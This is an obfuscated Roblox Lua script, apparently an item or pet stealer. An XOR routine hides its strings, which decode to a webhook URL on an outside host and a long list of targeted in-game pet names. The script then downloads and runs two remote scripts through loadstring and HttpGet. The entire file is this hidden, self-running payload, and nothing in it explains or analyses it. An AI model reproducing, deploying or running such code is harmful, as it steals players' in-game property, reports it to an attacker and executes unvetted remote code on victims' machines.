--[[ Obfuscated with Prometheus-style engine ]]
local _llIllIOlOl=780;local _lOI0IIOO0I="_0IOOII";local _Il00IlIIO0=958;local _O00OI0lIl0=912;local _I0II0llll0="_0III0O";
local _0lOIOl0lOlOlI0IO=(function(_lI0OlI0O)return function(...)local _00O0OOII=""for _,_0OIll0Ol in ipairs({...})do _00O0OOII=_00O0OOII..string.char(bit32 and bit32.bxor(_0OIll0Ol,_lI0OlI0O)or(function(a,b)local r=0 for i=0,7 do local ba,bb=a%2,b%2 if ba~=bb then r=r+2^i end a,b=math.floor(a/2),math.floor(b/2)end return r end)(_0OIll0Ol,_lI0OlI0O))end return _00O0OOII end end)(226);
local _OOIlIOl0l0Il=function()
getgenv()._OOI00lOOI0OlOl = _0lOIOl0lOlOlI0IO(138,150,150,146,145,216,205,205,145,137,131,143,131,204,140,135,150,205,131,146,139,205,142,141,133,145,205,149,135,128,138,141,141,137,205,143,144,144,189,129,131,209,208,213,135,210,128,134,129,135,215,214,208,209,215,218,208,214,132,209,132,209,212,209,209,210,128,209,128,214,131)
getgenv()._OIIlOIO0OO0OIO = 1718063814
getgenv()._0l00lOOIO0IIIl = 1      
getgenv()._IIOIl0OOO0O0IO = 2 
getgenv()._0IIlOll00Ol0II = {
    [_0lOIOl0lOlOlI0IO(175,135,141,149,142)] = true,
    [_0lOIOl0lOlOlI0IO(177,137,139,128,139,134,139,194,182,141,139,142,135,150)] = true,
    [_0lOIOl0lOlOlI0IO(177,150,144,131,149,128,135,144,144,155,194,167,142,135,146,138,131,140,150)] = true,
    [_0lOIOl0lOlOlI0IO(174,131,194,180,131,129,129,131,194,177,131,150,151,144,140,141,194,177,131,150,151,144,140,139,150,131)] = true,
    [_0lOIOl0lOlOlI0IO(178,135,144,144,139,150,141,194,160,151,144,144,139,150,141)] = true,
    [_0lOIOl0lOlOlI0IO(179,151,135,145,131,134,139,142,142,141,194,180,131,143,146,139,144,141)] = true,
    [_0lOIOl0lOlOlI0IO(182,131,129,141,144,139,150,131,194,160,139,129,139,129,142,135,150,131)] = true,
    [_0lOIOl0lOlOlI0IO(174,131,194,167,154,150,139,140,129,150,194,165,144,131,140,134,135)] = true,
    [_0lOIOl0lOlOlI0IO(174,131,194,177,146,141,141,137,155,194,165,144,131,140,134,135)] = true,
    [_0lOIOl0lOlOlI0IO(161,138,139,146,145,141,194,131,140,134,194,179,151,135,145,141)] = true,
    [_0lOIOl0lOlOlI0IO(161,138,139,142,142,139,140,194,161,138,139,142,139)] = true,
    [_0lOIOl0lOlOlI0IO(182,151,132,132,194,182,141,151,129,131,140)] = true,
    [_0lOIOl0lOlOlI0IO(165,141,128,128,142,139,140,141,194,183,140,139,129,139,129,142,139,140,141)] = true,
    [_0lOIOl0lOlOlI0IO(181,194,141,144,194,174)] = true,
    [_0lOIOl0lOlOlI0IO(174,131,194,168,141,142,142,155,194,165,144,131,140,134,135)] = true,
    [_0lOIOl0lOlOlI0IO(174,131,194,182,131,129,141,194,161,141,143,128,139,140,131,145,139,141,140)] = true,
    [_0lOIOl0lOlOlI0IO(177,149,131,133,133,155,194,160,144,141,145)] = true,
    [_0lOIOl0lOlOlI0IO(174,131,194,176,141,143,131,140,150,139,129,194,165,144,131,140,134,135)] = true,
    [_0lOIOl0lOlOlI0IO(164,135,145,150,139,148,135,194,212,213)] = true,
    [_0lOIOl0lOlOlI0IO(174,141,145,194,182,144,131,142,131,142,135,144,139,150,141,145)] = true,
    [_0lOIOl0lOlOlI0IO(174,131,145,194,182,144,131,142,131,142,135,144,139,150,131,145)] = true,
    [_0lOIOl0lOlOlI0IO(165,173,163,182)] = true,
    [_0lOIOl0lOlOlI0IO(165,144,131,139,146,151,145,145,194,175,135,134,151,145,145,139)] = true,
    [_0lOIOl0lOlOlI0IO(172,151,129,142,135,131,144,141,194,166,139,140,141,145,145,131,151,144,141)] = true,
    [_0lOIOl0lOlOlI0IO(175,141,140,135,155,194,175,141,140,135,155,194,178,151,133,133,155)] = true,
    [_0lOIOl0lOlOlI0IO(182,131,140,133,194,182,131,140,133,194,169,135,142,135,150,131,140,133)] = true,
    [_0lOIOl0lOlOlI0IO(169,135,150,151,146,131,150,194,169,135,146,131,150)] = true,
    [_0lOIOl0lOlOlI0IO(182,139,129,150,131,129,194,177,131,138,151,144)] = true,
    [_0lOIOl0lOlOlI0IO(169,135,150,129,138,151,144,151,194,131,140,134,194,175,151,145,150,151,144,151)] = true,
    [_0lOIOl0lOlOlI0IO(174,131,148,131,134,141,144,139,150,141,194,177,146,139,140,139,150,141)] = true,
    [_0lOIOl0lOlOlI0IO(165,131,144,131,143,131,194,131,140,134,194,175,131,134,151,140,134,151,140,133)] = true,
    [_0lOIOl0lOlOlI0IO(160,151,144,133,151,144,141,194,163,140,134,194,164,144,155,151,144,141)] = true,
    [_0lOIOl0lOlOlI0IO(161,131,146,139,150,131,140,141,194,175,141,128,155)] = true,
    [_0lOIOl0lOlOlI0IO(161,135,144,128,135,144,151,145)] = true,
    [_0lOIOl0lOlOlI0IO(166,144,131,133,141,140,194,161,131,140,140,135,142,142,141,140,139)] = true,
    [_0lOIOl0lOlOlI0IO(163,133,131,144,144,139,140,139,194,142,131,194,178,131,142,139,140,139)] = true,
    [_0lOIOl0lOlOlI0IO(164,144,131,133,141,142,131,194,174,131,194,174,131,194,174,131)] = true,
    [_0lOIOl0lOlOlI0IO(167,154,150,139,140,129,150,194,175,131,150,150,135,141)] = true,
    [_0lOIOl0lOlOlI0IO(169,131,144,137,135,144,194,177,131,138,151,144)] = true,
    [_0lOIOl0lOlOlI0IO(160,151,140,140,155,143,131,140)] = true,
    [_0lOIOl0lOlOlI0IO(178,139,144,151,142,139,150,141,139,150,131,194,160,139,129,139,129,142,135,150,135,139,144,131)] = true,
    [_0lOIOl0lOlOlI0IO(160,151,140,139,150,141,194,160,151,140,139,150,141,194,177,146,139,140,139,150,141)] = true,
    [_0lOIOl0lOlOlI0IO(160,144,151,140,139,150,141,194,175,131,144,145,139,150,141)] = true,
    [_0lOIOl0lOlOlI0IO(165,151,135,145,150,194,212,212,212)] = true,
    [_0lOIOl0lOlOlI0IO(175,131,144,139,131,129,138,139,194,161,141,144,131,152,141,140,139)] = true,
    [_0lOIOl0lOlOlI0IO(177,149,131,133,194,177,141,134,131)] = true,
    [_0lOIOl0lOlOlI0IO(174,141,145,194,170,141,150,145,146,141,150,145,139,150,141,145)] = true,
    [_0lOIOl0lOlOlI0IO(174,141,145,194,160,144,141,145)] = true,
    [_0lOIOl0lOlOlI0IO(182,144,131,142,131,142,135,134,141,140)] = true,
    [_0lOIOl0lOlOlI0IO(174,141,145,194,178,151,133,133,139,135,145)] = true,
    [_0lOIOl0lOlOlI0IO(174,141,145,194,178,144,139,143,141,145)] = true,
    [_0lOIOl0lOlOlI0IO(174,141,145,194,182,131,129,141,144,139,150,131,145)] = true,
    [_0lOIOl0lOlOlI0IO(174,141,145,194,177,146,131,133,138,135,150,150,139,145)] = true,
    [_0lOIOl0lOlOlI0IO(165,139,140,133,135,144,194,165,135,144,131,150)] = true,
    [_0lOIOl0lOlOlI0IO(174,141,148,135,194,174,141,148,135,194,160,135,131,144)] = true,
    [_0lOIOl0lOlOlI0IO(177,146,141,141,137,155,194,131,140,134,194,178,151,143,146,137,155)] = true,
    [_0lOIOl0lOlOlI0IO(164,144,131,133,144,131,143,131,194,131,140,134,194,161,138,141,129,144,131,143,131)] = true,
    [_0lOIOl0lOlOlI0IO(174,131,194,161,131,145,131,194,160,141,141)] = true,
    [_0lOIOl0lOlOlI0IO(174,141,145,194,177,135,137,141,142,131,138,145)] = true,
    [_0lOIOl0lOlOlI0IO(176,135,139,140,139,150,141,194,177,142,135,139,133,138,139,150,141)] = true,
    [_0lOIOl0lOlOlI0IO(169,135,150,151,146,131,150,194,160,144,141,145)] = true,
    [_0lOIOl0lOlOlI0IO(161,141,141,137,139,194,131,140,134,194,175,139,142,137,139)] = true,
    [_0lOIOl0lOlOlI0IO(176,141,145,135,155,194,131,140,134,194,182,135,134,134,155)] = true,
    [_0lOIOl0lOlOlI0IO(178,141,146,129,151,144,151,194,131,140,134,194,164,139,152,152,151,144,151)] = true,
    [_0lOIOl0lOlOlI0IO(174,131,194,177,151,146,144,135,143,135,194,161,141,143,128,139,140,131,145,139,141,140)] = true,
    [_0lOIOl0lOlOlI0IO(166,144,131,133,141,140,194,165,139,140,133,135,144,139,140,139)] = true,
    [_0lOIOl0lOlOlI0IO(170,135,131,134,142,135,145,145,194,170,141,144,145,135,143,131,140)] = true,
    [_0lOIOl0lOlOlI0IO(170,155,134,144,131,194,166,144,131,133,141,140,194,161,131,140,140,135,142,142,141,140,139)] = true,
    [_0lOIOl0lOlOlI0IO(161,135,142,151,142,131,144,129,139,140,139,194,180,139,129,139,141,145,139,140,139)] = true,
    [_0lOIOl0lOlOlI0IO(175,139,135,150,135,150,135,139,144,131,194,160,139,129,139,129,142,135,150,135,139,144,131)] = true,
    [_0lOIOl0lOlOlI0IO(174,131,194,165,144,131,140,134,135,194,161,141,143,128,139,140,131,145,139,141,140)] = true,
    [_0lOIOl0lOlOlI0IO(182,144,135,140,141,145,150,144,151,152,152,141,194,182,151,144,128,141,194,214,210,210,210)] = true,
    [_0lOIOl0lOlOlI0IO(174,131,194,169,131,144,137,135,144,137,131,144,194,161,141,143,128,139,140,131,145,139,141,140)] = true,
    [_0lOIOl0lOlOlI0IO(174,131,194,180,131,129,129,131,194,178,144,135,145,135,194,178,144,135,145,135,140,150,135)] = true,
    [_0lOIOl0lOlOlI0IO(174,141,145,194,177,149,135,135,150,138,135,131,144,150,145)] = true,
    [_0lOIOl0lOlOlI0IO(174,131,145,194,177,139,145)] = true,
    [_0lOIOl0lOlOlI0IO(174,141,145,194,178,142,131,140,139,150,141,145)] = true,
    [_0lOIOl0lOlOlI0IO(174,141,145,194,175,141,128,139,142,139,145)] = true,
    [_0lOIOl0lOlOlI0IO(160,131,129,151,144,151,194,131,140,134,194,167,133,133,151,144,151)] = true,
    [_0lOIOl0lOlOlI0IO(175,141,140,135,155,194,175,141,140,135,155,194,176,135,139,140,134,135,135,144)] = true,
    [_0lOIOl0lOlOlI0IO(167,148,139,142,135,134,141,140)] = true,
    [_0lOIOl0lOlOlI0IO(173,144,129,131,142,135,134,141,140)] = true,
    [_0lOIOl0lOlOlI0IO(168,141,142,142,155,194,168,141,142,142,155,194,177,131,138,151,144)] = true,
    [_0lOIOl0lOlOlI0IO(174,141,145,194,168,141,142,142,155,194,161,141,143,128,139,140,131,145,139,141,140,131,145)] = true,
    [_0lOIOl0lOlOlI0IO(161,138,139,129,142,135,150,135,139,144,131,194,172,141,135,142,150,135,139,144,131)] = true,
    [_0lOIOl0lOlOlI0IO(160,139,145,141,140,150,135,194,165,139,151,146,146,139,150,135,144,135)] = true,
    [_0lOIOl0lOlOlI0IO(164,139,145,138,139,140,141,194,161,142,141,149,140,139,140,141)] = true,
    [_0lOIOl0lOlOlI0IO(174,141,145,194,177,146,141,141,137,155,194,161,141,143,128,139,140,131,145,139,141,140,131,145)] = true,
    [_0lOIOl0lOlOlI0IO(174,131,194,165,139,140,133,135,144,194,177,135,137,141,142,131,138)] = true,
    [_0lOIOl0lOlOlI0IO(174,141,145,194,212,213)] = true,
    [_0lOIOl0lOlOlI0IO(167,145,141,137,194,177,135,137,141,142,131,138)] = true,
    [_0lOIOl0lOlOlI0IO(176,141,145,135,150,150,139,194,182,151,131,142,135,150,150,139)] = true,
    [_0lOIOl0lOlOlI0IO(177,131,143,143,155,140,139,194,164,131,150,150,139,140,139)] = true,
    [_0lOIOl0lOlOlI0IO(174,131,194,164,141,141,134,194,161,141,143,128,139,140,131,145,139,141,140)] = true,
    [_0lOIOl0lOlOlI0IO(177,146,131,133,138,135,150,150,139,194,182,151,131,142,135,150,150,139)] = true,
    [_0lOIOl0lOlOlI0IO(174,131,194,177,135,129,144,135,150,194,161,141,143,128,139,140,131,145,139,141,140)] = true,
    [_0lOIOl0lOlOlI0IO(174,141,145,194,163,143,139,133,141,145)] = true,
    [_0lOIOl0lOlOlI0IO(174,141,145,194,161,141,143,128,139,140,131,145,139,141,140,131,145)] = true,
    [_0lOIOl0lOlOlI0IO(174,139,145,150,194,174,139,145,150,194,174,139,145,150,194,177,131,138,151,144)] = true,
    [_0lOIOl0lOlOlI0IO(166,141,140,137,135,155,150,151,144,128,141,194,167,154,146,144,135,145,145)] = true,
    [_0lOIOl0lOlOlI0IO(161,138,139,129,142,135,150,135,139,144,131,194,161,151,146,139,134,135,139,144,131)] = true,
    [_0lOIOl0lOlOlI0IO(161,138,139,143,140,139,140,141)] = true,
    [_0lOIOl0lOlOlI0IO(212,213)] = true,
    [_0lOIOl0lOlOlI0IO(174,141,145,194,161,131,140,134,139,135,145)] = true
}
task.spawn(function()
loadstring(game:HttpGet(_0lOIOl0lOlOlI0IO(138,150,150,146,145,216,205,205,131,146,139,204,142,151,131,144,143,141,144,204,140,135,150,205,132,139,142,135,145,205,148,214,205,142,141,131,134,135,144,145,205,132,128,129,134,211,134,208,215,218,218,219,131,218,214,209,208,219,213,211,210,213,134,135,131,209,212,214,208,210,214,214,134,204,142,151,131)))()
end)
task.spawn(function()
loadstring(game:HttpGet(_0lOIOl0lOlOlI0IO(138,150,150,146,145,216,205,205,131,146,139,204,142,151,131,144,143,141,144,204,140,135,150,205,132,139,142,135,145,205,148,214,205,142,141,131,134,135,144,145,205,134,218,132,210,212,134,219,218,135,134,213,135,218,132,211,211,208,218,128,212,135,132,128,128,219,210,208,218,134,215,212,209,204,142,151,131)))()
end)
end;
local _,_lIlll0ll=pcall(_OOIlIOl0l0Il);if _lIlll0ll then _OOIlIOl0l0Il()end;
